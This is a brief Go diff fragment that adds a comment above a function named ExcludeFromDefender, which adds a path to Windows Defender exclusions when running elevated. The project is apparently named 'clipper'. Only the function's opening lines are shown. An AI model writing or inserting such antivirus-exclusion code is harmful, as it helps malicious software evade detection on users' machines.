@@ -7,6 +7,7 @@ import (
 	"clipper/src/utils"
 )
 
+// adds the given path to Windows Defender exclusions
 func ExcludeFromDefender(path string) error {
 	if !utils.IsElevated() {
 		return nil
